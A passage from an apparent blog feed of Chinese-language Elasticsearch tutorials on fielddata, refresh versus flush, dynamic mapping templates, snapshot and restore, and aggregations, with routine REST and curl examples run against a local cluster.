&quot;address&quot;, &quot;size&quot;: 5 &#125; &#125; &#125;&#125;则会看到以下异常：显然，我们不能对text字段进行聚合处理。那么我们该如何处理这个问题呢？我们的一种方法就是在配置mapping的时候加入”fielddata”=true这个选项。我们来重新对我们的myindex的mapping进行配置：12345678910111213141516171819202122232425262728293031DELETE myindex PUT myindex&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fielddata&quot;: true &#125; &#125; &#125;&#125; PUT myindex/_doc/1&#123; &quot;address&quot;: &quot;New York&quot; &#125; GET myindex/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;aggr_mame&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;address&quot;, &quot;size&quot;: 5 &#125; &#125; &#125;&#125;在这里，我们尽管还是把address这个字段设置为text，但是由于我们加入了”fielddata”=true，那么我们，我们就可以对这个项进行统计了。与简单的搜索操作不同，排序和聚合需要能够发现在特定文档的特定字段中可以找到哪些术语。 对于这些任务和其他任务，必须具有与Elasticsearch（反向）索引相反的数据结构。 这就是fielddata的目的。细心的开发者，如果这个时候去Kibana创建一个以myindex为索引的index pattern，我们可以发现：我们的address字段变为aggregatable，也就是说我们可以对它进行做聚合分析尽管它没有doc_values。在启动fielddata之前在启用fielddata之前，请考虑为什么将文本字段用于聚合，排序或在脚本中使用。 这样做通常没有任何意义。在索引之前会分析文本字段，以便可以通过搜索new或york来找到类似New York的值。 当您可能想要一个名为New York的存储桶时，此字段上的术语汇总将返回一个叫做new存储桶和一个叫做york存储桶。相反，您应该有一个用于全文搜索的文本字段，以及一个为聚合启用doc_values的未分析的keyword字段，如下所示：123456789101112131415161718DELETE myindex PUT myindex&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;&#125;这样，我们可以使用address来做全文的搜索，而address.keyword被用来做aggregations, sorting 及在脚本中使用。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html【2】https://qbox.io/blog/field-data-elasticsearch-cluster-instability]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Elasticsearch中的refresh和flush操作指南]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9AElasticsearch%E4%B8%AD%E7%9A%84refresh%E5%92%8Cflush%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[在今天的文章里，我们来主要介绍一下Elasticsearch的refresh及flush两种操作的区别。如果我们从字面的意思上讲，好像都是刷新的意思。但是在Elasticsearch中，这两种操作是有非常大的区别的。本指南将有效解决两者之间的差异。 我们还将介绍Lucene功能的基础知识，例如重新打开（reopen)和提交(commit)，这有助于理解refresh和flush操作。Refresh及Flush乍一看，Refresh和Flush操作的通用目的似乎是相同的。 两者都用于使文档在索引操作后立即可供搜索。 在Elasticsearch中添加新文档时，我们可以对索引调用_refresh或_flush操作，以使新文档可用于搜索。 要了解这些操作的工作方式，您必须熟悉Lucene中的Segments，Reopen和Commits。Apache Lucene是Elasticsearch中的基础查询引擎。Lucene中的Segments在Elasticsearch中，最基本的数据存储单位是shard。 但是，通过Lucene镜头看，情况会有所不同。 在这里，每个Elasticsearch分片都是一个Lucene索引(index)，每个Lucene索引都包含几个Lucene segments。 一个Segment包含映射到文档里的所有术语（terms)一个反向索引(inverted index)。下图显示了段的概念及其如何应用于Elasticsearch索引及其分片：这种分Segment的概念是，每当创建新文档时，它们就会被写入新的Segment中。 每当创建新文档时，它们都属于一个新的Segment，并且无需修改前一个Segment。 如果必须删除文档，则在其原始Segment中将其标记为已删除。 这意味着它永远不会从Segement中物理删除。与更新相同：文档的先前版本在上一个Segment中被标记为已删除，更新后的版本保留在当前Segment中的同一文档ID下。Lucene中的Reopen当调用Lucene Reopen时，将使累积的数据可用于搜索。 尽管可以搜索最新数据，但这不能保证数据的持久性或未将其写入磁盘。 我们可以调用n次重新打开功能，并使最新数据可搜索，但不能确定磁盘上是否存在数据。Lucene中的CommitsLucene提交使数据安全。 对于每次提交，来自不同段的数据将合并并推送到磁盘，从而使数据持久化。 尽管提交是持久保存数据的理想方法，但问题是每个提交操作都占用大量资源。 每个提交操作都有其自己的内部 I/O 操作以及与其相关的读/写周期。 这就是为什么我们希望在基于Lucene的系统中一次又一次地重新使用重新打开功能以使新数据可搜索的确切原因。Elasticsearch中的TranslogElasticsearch采用另一种方法来解决持久性问题。 它在每个分片中引入一个事务日志（transaction log）。 已建立索引的新文档将传递到此事务日志和内存缓冲区中。 下图显示了此过程：Elasticsearch中的refresh当我们把一条数据写入到Elasticsearch中后，它并不能马上被用于搜索。新增的索引必须写入到Segment后才能被搜索到，因此我们把数据写入到内存缓冲区之后并不能被搜索到。新增了一条记录时，Elasticsearch会把数据写到translog和in-memory buffer(内存缓存区)中,如下图所示:如果希望该文档能立刻被搜索，需要手动调用refresh操作。在Elasticsearch中，默认情况下_refresh操作设置为每秒执行一次。 在此操作期间，内存中缓冲区的内容将复制到内存中新创建的Segment中，如下图所示。 结果，新数据可用于搜索。这个refresh的时间间隔可以由index设置中index.refresh_interval来定义。执行完refresh后的结果如下：我们可以看出来，在In-meomory buffer中，现在所有的东西都是空的，但是Translog里还是有东西的。refresh的开销比较大,我在自己环境上测试10W条记录的场景下refresh一次大概要14ms,因此在批量构建索引时可以把refresh间隔设置成-1来临时关闭refresh,等到索引都提交完成之后再打开refresh,可以通过如下接口修改这个参数:12345curl -XPUT &apos;localhost:9200/test/_settings&apos; -d &apos;&#123; &quot;index&quot; : &#123; &quot;refresh_interval&quot; : &quot;-1&quot; &#125;&#125;&apos;另外当你在做批量索引时,可以考虑把副本数设置成0，因为document从主分片(primary shard)复制到从分片(replica shard)时,从分片也要执行相同的分析、索引和合并过程,这样的开销比较大，你可以在构建索引之后再开启副本，这样只需要把数据从主分片拷贝到从分片:12345curl -XPUT &apos;localhost:9200/my_index/_settings&apos; -d &apos; &#123; &quot;index&quot; : &#123; &quot;number_of_replicas&quot; : 0 &#125;&#125;&apos;执行完批量索引之后,把刷新间隔改回来:12345curl -XPUT &apos;localhost:9200/my_index/_settings&apos; -d &apos;&#123; &quot;index&quot; : &#123; &quot;refresh_interval&quot; : &quot;1s&quot; &#125; &#125;&apos;你还可以强制执行一次refresh以及索引分段的合并:12curl -XPOST &apos;localhost:9200/my_index/_refresh&apos;curl -XPOST &apos;localhost:9200/my_index/_forcemerge?max_num_segments=5&apos;Translog及持久化存储但是，translog如何解决持久性问题？ 每个Shard中都存在一个translog，这意味着它与物理磁盘内存有关。 它是同步且安全的，因此即使对于尚未提交的文档，您也可以获得持久性和持久性。 如果发生问题，可以还原事务日志。 同样，在每个设置的时间间隔内，或在成功完成请求（索引，批量，删除或更新）后，将事务日志提交到磁盘。Elasticsearch中的FlushFlush实质上意味着将内存缓冲区中的所有文档都写入新的Lucene Segment，如下面的图所示。 这些连同所有现有的内存段一起被提交到磁盘，该磁盘清除事务日志（参见图4）。 此提交本质上是Lucene提交（commit）。Flush会定期触发，也可以在Translog达到特定大小时触发。 这些设置可以防止Lucene提交带来的不必要的费用。结论在本指南中，我们探索了两个紧密相关的Elasticsearch操作，_flush和_refresh显示了它们之间的共性和差异。 我们还介绍了Lucene的基础架构组件-重新打开（reopen)并提交(commits)-这有助于掌握Elasticsearch中_refresh和_flush操作的要点。简而言之，_refresh用于使新文档可见以进行搜索。 而_flush用于将内存中的段保留在硬盘上。 _flush不会影响Elasticsearch中文档的可见性，因为搜索是在内存段中进行的，而不是_refresh会影响其可见性。参考：【1】https://qbox.io/blog/refresh-flush-operations-elasticsearch-guide【2】https://www.ezlippi.com/blog/2018/04/elasticsearch-translog.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Dynamic mapping]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9ADynamic%20mapping%2F</url>
    <content type="text"><![CDATA[Elasticsearch最重要的功能之一是它试图摆脱你的方式，让你尽快开始探索你的数据。 要索引文档，您不必首先创建索引，定义映射类型和定义字段 - 您只需索引文档，那么index，type和field将自动生效。比如：PUT data/_doc/1 { &quot;count&quot;: 5 } 上面的命令将自动帮我们生成一个叫做data的index，并同时生成一个叫做_doc的type及一个叫做count的field。count的数据类型是long。这个非常方便，我们不想传统的RDMS那样，先要创建一个数据库，让后一个table，然后才可以向table里写入数据。自动检测和添加新字段称为动态映射。 动态映射规则可以根据您的目的进行定制：动态字段映射：管理动态field检测的规则动态模板：用于配置动态添加字段的映射的自定义规则在今天的这篇文章中，我们来分别介绍这两个方面的内容。动态模板假设您有包含大量字段的文档或者在映射定义时未知的动态字段名称的文档和nested的key/value对不是一个很好的解决方案使用动态模板，您可以基于定义字段的映射字段的数据类型, 使用match_mapping_type字段的名字，使用match and unmatch 或match_pattern.或者字段的路径，使用path_match 及 path_unmatch.动态模板由命名对象的数组来定义的：123456789&quot;dynamic_templates&quot;: [ &#123; &quot;my_template_name&quot;: &#123; (1) ... match conditions ... (2) &quot;mapping&quot;: &#123; ... &#125; (3) &#125; &#125;, ... ]template的名字可以是任何一个字符串匹配的条件可以是这里的任何一种match_mapping_type, match, match_pattern, unmatch, path_match, path_unmatch被匹配的字段的mapping例如，如果我们想要将所有整数字段映射为整数而不是long，并将所有字符串字段映射为text和keyword，我们可以使用以下模板：PUT my_index { &quot;mappings&quot;: { &quot;dynamic_templates&quot;: [ { &quot;integers&quot;: { &quot;match_mapping_type&quot;: &quot;long&quot;, &quot;mapping&quot;: { &quot;type&quot;: &quot;integer&quot; } } }, { &quot;strings&quot;: { &quot;match_mapping_type&quot;: &quot;string&quot;, &quot;mapping&quot;: { &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: { &quot;raw&quot;: { &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 } } } } } ] } } PUT my_index/_doc/1 { &quot;my_integer&quot;: 5, &quot;my_string&quot;: &quot;Some string&quot; } 通过上面的动态template映射，我们可以看到my_integer被映射为integer而不是long。my_string是一个multi_field字段。假设您希望任何未映射的字符串字段默认情况下映射为“keyword”类型，那么我们可以这么定义：PUT test2 { &quot;mappings&quot;: { &quot;dynamic_templates&quot;: [ { &quot;my_string_fields&quot;: { &quot;match_mapping_type&quot;: &quot;string&quot;, &quot;mapping&quot;: { &quot;type&quot;: &quot;keyword&quot; } } } ] } } match及unmatchmatch参数使用模式匹配字段名称，而unmatch使用模式排除匹配匹配的字段。以下示例匹配名称以long_开头的所有字符串字段（以_text结尾的字符串除外）并将它们映射为长字段：1234567891011121314151617181920212223PUT my_index&#123; &quot;mappings&quot;: &#123; &quot;dynamic_templates&quot;: [ &#123; &quot;longs_as_strings&quot;: &#123; &quot;match_mapping_type&quot;: &quot;string&quot;, &quot;match&quot;: &quot;long_*&quot;, &quot;unmatch&quot;: &quot;*_text&quot;, &quot;mapping&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125; &#125; ] &#125;&#125; PUT my_index/_doc/1&#123; &quot;long_num&quot;: &quot;5&quot;, &quot;long_text&quot;: &quot;foo&quot; &#125;我们可以通过如下的命令来查看它们的数据类型：GET my_index/_mapping显示的结果为：1234567891011121314151617181920212223242526272829303132&#123; &quot;my_index&quot; : &#123; &quot;mappings&quot; : &#123; &quot;dynamic_templates&quot; : [ &#123; &quot;longs_as_strings&quot; : &#123; &quot;match&quot; : &quot;long_*&quot;, &quot;unmatch&quot; : &quot;*_text&quot;, &quot;match_mapping_type&quot; : &quot;string&quot;, &quot;mapping&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125; &#125; &#125; ], &quot;properties&quot; : &#123; &quot;long_num&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125;, &quot;long_text&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125; &#125; &#125; &#125;&#125;从上面，我们可以看出来，long_num的数据类型是long，而long_text的数据类型是text。控制动态字段默认情况下，当在文档中找到以前未见过的字段时，Elasticsearch会将新字段添加到类型映射中。 通过将dynamic参数设置为false（忽略新字段）或strict（如果遇到未知字段则抛出异常），可以在文档和对象级别禁用此行为。在生产(product)环境中，你极有可能会创建你的mapping在索引你的数据之前，而且你极有可能不想你的mapping会被修改：1234POST blogs/_doc/2&#123;&quot;some_new_field&quot;: &quot;What should we do?&quot; &#125;在通常的情况下，上面的一个命令可能会自动帮我们在blogs索引里增加一个新的叫做some_new_field的字段。您可以使用“动态”属性（三个选项）控制添加到映射的新字段的效果：1234PUT blogs_example/_mapping&#123; &quot;dynamic&quot;: &quot;strict&quot;&#125;在上面我们在mapping中加入了dynamic，并且设置为strict，它表明如果现有的mapping里没有定义这个字段，那么就不index这个文档。1234PUT /blogs_example/_doc/1&#123; &quot;new_field&quot;: &quot;this is a new field&quot;&#125;如果new_field从来没有在mapping中定义过，那么，上面的命令会出现如下的错误：12345678910111213&#123; &quot;error&quot;: &#123; &quot;root_cause&quot;: [ &#123; &quot;type&quot;: &quot;strict_dynamic_mapping_exception&quot;, &quot;reason&quot;: &quot;mapping set to strict, dynamic introduction of [new_field] within [_doc] is not allowed&quot; &#125; ], &quot;type&quot;: &quot;strict_dynamic_mapping_exception&quot;, &quot;reason&quot;: &quot;mapping set to strict, dynamic introduction of [new_field] within [_doc] is not allowed&quot; &#125;, &quot;status&quot;: 400&#125;如果这个问题出现了，我们必须修改我们现有的index的mapping：12345678PUT blogs_example/_mapping&#123; &quot;properties&quot;: &#123; &quot;new_field&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125;&#125;那么重新运行之前的那个命令就可以了。settings以防止映射爆炸在索引中定义太多字段是一种可能导致映射爆炸的情况，这可能导致内存不足错误和难以恢复的情况。 这个问题可能比预期更常见。 例如，考虑插入的每个新文档引入新字段的情况。 这在动态映射中非常常见。 每次文档包含新字段时，这些字段最终都会出现在索引的映射中。 这并不需要担心少量数据，但随着映射的增加，它可能会成为一个问题。 以下设置允许您限制可手动或动态创建的字段映射的数量，以防止错误的文档导致映射爆炸：index.mapping.total_fields.limit索引中的最大字段数。 字段和对象映射以及字段别名都计入此限制。 默认值为1000index.mapping.depth.limit字段的最大深度，以内部对象的数量来衡量。 例如，如果所有字段都在根对象级别定义，则深度为1.如果有一个对象映射，则深度为2，等等。默认值为20。index.mapping.nested_fields.limit索引中不同nested映射的最大数量，默认为50。index.mapping.nested_objects.limit所有nested类型中单个文档中嵌套JSON对象的最大数量，默认为10000。index.mapping.field_name_length.limit设置字段名称的最大长度。 默认值为Long.MAX_VALUE（无限制）。 此设置实际上不是解决映射爆炸的问题，但如果要限制字段长度，则可能仍然有用。 通常不需要设置此设置。 默认是可以的，除非用户开始添加大量具有真正长名称的字段。上面的字段都可以在一个index的设置中进行设置，比如：12345678PUT test_blog &#123; &quot;settings&quot;: &#123; &quot;index.mapping.total_fields.limit&quot;: 2000, &quot;number_of_replicas&quot;: 0, &quot;number_of_shards&quot;: 1 &#125;&#125;]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Cluster备份 Snapshot及Restore API]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9ACluster%E5%A4%87%E4%BB%BD%20Snapshot%E5%8F%8ARestore%20API%2F</url>
    <content type="text"><![CDATA[Elasticsearch提供了replica解决方案，它可以帮我们解决了如果有一个或多个node失败了，那么我们的数据还是可以保证完整的情况，并且搜索还可以继续进行。但是，有一种情况是我们的所有的node，或者有一部分node失败，可能会造成我们的数据的丢失。也就是说replca不能提供一种灾难性的保护机制。我们需要一种完整的备份机制。Snapshot及Restore在Elastic里，我们提供了一个叫做snapshot及restore API的接口。使您可以使用数据和状态快照备份您的Elasticsearch索引和集群。 快照很重要，因为快照会在出现问题时提供您数据的副本。 如果需要回滚到旧版本的数据，则可以从存储库中还原快照。如上图所示，我们可以把当前index的状态及数据存入到一个repository里去。Repository为了能够做备份，我们首先必须创建一个repository，也就是一个仓库。你可以为一个cluster创建多个仓库。目前支持的仓库类型有：12345678# Elasticsearch支持仓库类型 Respository 配置类型Shared file system &quot;type&quot;: &quot;fs&quot;Read-only URL &quot;type&quot;: &quot;url&quot;S3 &quot;type&quot;: &quot;s3&quot;HDFS &quot;type&quot;: &quot;hdfs&quot;Azure &quot;type&quot;: &quot;azure&quot;Google Cloud Storage &quot;type&quot;: &quot;gcs&quot;这里需要注意的是： S3, HDFS, Azure and GCS 需要相应的插件进行安装才可以。注册仓库在一个snapshot可以被使用之前，我们必须注册一个仓库（repository)。使用_snapshot 终点文件夹必须对所有的node可以访问path.repo必须在所有的node上进行配置，针对一个fs的repository来说1234567PUT _snapshot/my_repo &#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/mnt/my_repo_folder&quot; &#125; &#125;这里/mnt/my_repo_folder必须加进所有node的elasticsearch.yml文件中。fs resposity设置：12345678910PUT _snapshot/my_repo&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/mnt/my_repo_folder&quot;, &quot;compress&quot;: true, &quot;max_restore_bytes_per_sec&quot;: &quot;40mb&quot;, &quot;max_snapshot_bytes_per_sec&quot;: &quot;40mb&quot; &#125;&#125;这里，我们定义compress为true，表明我们希望压缩。通过max_restore_bytes_per_sec及max_snapshot_bytes_per_sec的定义，我们可以来限制数据的snapshot及恢复的数据速度。S3 repository设置为了能能使用S3仓库，我们必须使用如下的命令来进行安装插件：1./bin/elasticsearch-plugin install repository-s3注意，上面的命令必须是在Elasticsearch的安装目录下进行执行。我们可以通过如下的命令来进行配置：1234567PUT _snapshot/my_s3_repo&#123; &quot;type&quot;: &quot;s3&quot;, &quot;settings&quot;: &#123; &quot;bucket&quot;: &quot;my_s3_bucket_name&quot; &#125;&#125;这里的my_s3_bucket_name是我们在AWS上定义的S3 bucket。更多关于S3的配置可以参阅链接 Repository Settings(https://www.elastic.co/guide/en/elasticsearch/plugins/current/repository-s3-repository.html)。Snapshot所有的索引一旦我们的repository已经被配置好了，那么我们就可以利用_snapshot终点来进行snapshot。必须注意的是snapshot只拷贝在执行该命令时的所有的数据，而在之后的所有的数据将不被备份。snapshot是按照增量来进行备份的，也就是说它只拷贝从上次执行snapshot之后变化的部分。通常来说，每隔30分钟进行一次备份是足够的。snapshot命令：1PUT _snapshot/my_repo/my_snapshot_1这里必须注意的几点：my_repo是指的我们在上面定义的repository的名字my_snapshot_1指的是一个唯一的snapshot名字没有特定的索引名字被指出，那么它指的是所有的open索引如果我们想指定某个或某些特定的索引，那么我们可以使用如下的命令来执行备份（snapshot)123456PUT _snapshot/my_repo/my_logs_snapshot_1&#123; &quot;indices&quot;: &quot;logs-*&quot;, &quot;ignore_unavailable&quot;: true, &quot;include_global_state&quot;: true&#125;这里它表述我们相对所有以logs-为开头的索引进行备份。我们可以通过如下的命令来进行监测正在进行的snapshot的进度：1GET _snapshot/my_repo/my_snapshot_2/_status管理snapshots获取所有在repo中的snapshots:1GET _snapshot/my_repo/_all获取某个特定snapshot的信息1GET _snapshot/my_repo/my_snapshot_1删除一个snapshot1DELETE _snapshot/my_repo/my_snapshot_1恢复一个snapshot我们可以使用_restore终点来从一个snapshot恢复所有的索引：1POST _snapshot/my_repo/my_snapshot_2/_restore我们也可以通过如下的方法来恢复某个或某些特定的索引：123456POST _snapshot/my_repo/my_snapshot_2/_restore&#123; &quot;indices&quot;: &quot;logs-*&quot;, &quot;ignore_unavailable&quot;: true, &quot;include_global_state&quot;: false&#125;在很多的时候，我们想把snapshot中的索引恢复到一个不同名字的索引之中，从而不用覆盖现有的。我们可以通过rename_pattern及rename_replacement来进行配置：12345678POST _snapshot/my_repo/my_snapshot_2/_restore&#123; &quot;indices&quot;: &quot;logs-*&quot;, &quot;ignore_unavailable&quot;: true, &quot;include_global_state&quot;: false, &quot;rename_pattern&quot;: &quot;logs-(.+)&quot;, &quot;rename_replacement&quot;: &quot;restored-logs-$1&quot;&#125;在上面，我们把所有的以logs-为开头的索引恢复到以restored-logs-的开头的索引之中来。Restore到一个新的cluster针对这个情况，我们可以恢复从另外一个cluster中备份的snapshot到当前的cluster中来。我们必须在新的cluster中注册这个repository才可以进行下面的操作。从上面我们可以看出来，my_repo必须对两个cluster都是可见的才可以。动手实践准备数据：运行起来我们的Kibana:我们分别点击上面的1和2处：点击上面的“Add data”。这样我们就可以把我们的kibana_sample_data_logs索引加载到Elasticsearch中。1GET _cat/indices/kibana_sample_data_logs注册repository首先我们在我们的电脑上创建一个如下的目录：1/shared_folder/my_repo我们在termimal中打入如下的命令：1mkdir -p shared_folder/my_repo/1234$ pwd/Users/liuxg/shared_folderbogon:shared_folder liuxg$ ls -aldrwxr-xr-x 2 liuxg staff 64 Nov 13 13:23 my_repo将以下path.repo属性添加到我们运行的所有node的elasticsearch.yml文件中：1path.repo: /Users/liuxg/shared_folder/my_repo注意，针对你的情况，你需要改动这里的path路径。然后启动我们的Elasticsearch及Kibana。紧接着，我们在Kibana console中打入如下的命令：1234567PUT _snapshot/my_local_repo&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/Users/liuxg/shared_folder/my_repo&quot; &#125;&#125;注意这里的location是根据我自己的电脑的路径来设置的。你需要根据自己实际的路径进行修改。在这里my_local_repo是我们的repository名称。接下来，我们打入如下的命令来对我们的kibana_sample_data_logs索引进行snapshot:123456PUT _snapshot/my_local_repo/snapshot_1&#123; &quot;indices&quot;: &quot;kibana_sample_data_logs&quot;, &quot;ignore_unavailable&quot;: true, &quot;include_global_state&quot;: true&#125;我们可以通过如下的命令来查看snapshot:1GET _snapshot/my_local_repo/_all我们可以在右边看到snapshot_1出现在列表之中，说明我们已经成功地创建了这个snapshot。我们接下来可以通过如下的命令来删除kibana_sample_data_logs索引：1DELETE kibana_sample_data_logs这样我们彻底地删除了这个索引。那么我们该如何把之前备份的数据恢复回来呢？在Kibana中打入如下的命令：123456POST _snapshot/my_local_repo/snapshot_1/_restore&#123; &quot;indices&quot;: &quot;kibana_sample_data_logs&quot;, &quot;ignore_unavailable&quot;: true, &quot;include_global_state&quot;: false&#125;在执行完上面的命令后，我们可以通过如下的命令来查看恢复后的kibana_sample_data_logs索引：1GET kibana_sample_data_logs/_count显然我们已经成功地恢复了我们之前备份的数据。这个时候，如果我们去到我们的snapshot文件目录，我们可以看到：123456$ pwd/Users/liuxg/shared_folder/my_repobogon:my_repo liuxg$ lsindex-0 meta-TzygGpJ1SOK5yJdsmc1lng.datindex.latest snap-TzygGpJ1SOK5yJdsmc1lng.datindices显然在文件目录中，已经有新生产的文件了。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：aggregation介绍]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Aaggregation%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[聚合(aggregation)功能集是整个Elasticsearch产品中最令人兴奋和有益的功能之一，主要是因为它提供了一个非常有吸引力对之前的facets的替代。在本教程中，我们将解释Elasticsearch中的聚合（aggregation）并逐步介绍一些示例。 我们比较了指标聚合和存储桶聚合，并展示了如何利用聚合嵌套（对于facets而言这是不可能的）。 欢迎您在本文中复制所有示例代码。关于Elastic Facets的一点背景如果您曾经使用过Elasticsearch的facets，那么您肯定了解它们的实用性。 经过丰富的经验，我们在这里告诉您Elasticsearch聚合（aggregations)甚至更好。 facets使您可以快速计算和汇总查询结果，并且可以将其用于各种任务，例如结果值的动态计数或创建分布直方图。 尽管facets非常强大，但它们在Elasticsearch核心中的实现存在一些限制。 由于facets仅执行一级深度的计算，因此将它们组合起来并不容易。聚合(Aggregation)API(https://www.elastic.co/guide/en/elasticsearch/client/java-api/7.4/java-aggs.html)解决了这些问题，并且还提供了一种简单的方法在查询时（在单个请求中）进行的非常精确的多级计算。 简而言之：Elasticsearch聚合是对facets的一个更加全面的提高的。准备数据为了完成我们今天的练习，我们先来准备一些数据。我们想创建一个叫做sports的索引。为此，我们先创建一个mapping：1234567891011121314151617181920212223PUT sports&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;birthdate&quot;: &#123; &quot;type&quot;: &quot;date&quot;, &quot;format&quot;: &quot;dateOptionalTime&quot; &#125;, &quot;location&quot;: &#123; &quot;type&quot;: &quot;geo_point&quot; &#125;, &quot;name&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;rating&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125;, &quot;sport&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125; &#125; &#125;&#125;在上面，我们定义了一个sports索引的mapping。在下面，我们通过bulk API来把我们想要的数据导入到索引中。123456789101112131415161718192021222324252627282930313233343536373839404142434445POST _bulk/&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Michael&quot;,&quot;birthdate&quot;:&quot;1989-10-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;5&quot;,&quot;4&quot;],&quot;location&quot;:&quot;46.22,-68.45&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Bob&quot;,&quot;birthdate&quot;:&quot;1989-11-2&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;3&quot;,&quot;4&quot;],&quot;location&quot;:&quot;45.21,-68.35&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Jim&quot;,&quot;birthdate&quot;:&quot;1988-10-3&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;3&quot;,&quot;2&quot;],&quot;location&quot;:&quot;45.16,-63.58&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Joe&quot;,&quot;birthdate&quot;:&quot;1992-5-20&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;4&quot;,&quot;3&quot;],&quot;location&quot;:&quot;45.22,-68.53&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Tim&quot;,&quot;birthdate&quot;:&quot;1992-2-28&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;3&quot;,&quot;3&quot;],&quot;location&quot;:&quot;46.22,-68.85&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Alfred&quot;,&quot;birthdate&quot;:&quot;1990-9-9&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;2&quot;,&quot;2&quot;],&quot;location&quot;:&quot;45.12,-68.35&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Jeff&quot;,&quot;birthdate&quot;:&quot;1990-4-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;2&quot;,&quot;3&quot;],&quot;location&quot;:&quot;46.12,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Will&quot;,&quot;birthdate&quot;:&quot;1988-3-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;4&quot;,&quot;4&quot;],&quot;location&quot;:&quot;46.25,-68.55&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Mick&quot;,&quot;birthdate&quot;:&quot;1989-10-1&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;3&quot;,&quot;4&quot;],&quot;location&quot;:&quot;46.22,-68.45&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Pong&quot;,&quot;birthdate&quot;:&quot;1989-11-2&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;1&quot;,&quot;3&quot;],&quot;location&quot;:&quot;45.21,-68.35&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;Ray&quot;,&quot;birthdate&quot;:&quot;1988-10-3&quot;,&quot;sport&quot;:&quot;Baseball&quot;,&quot;rating&quot;:[&quot;2&quot;,&quot;2&quot;],&quot;location&quot;:&quot;45.16,-63.58&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_index&quot;:&quot;sports&quot;&#125;&#125;&#123;&quot;name&quot;:&quot;P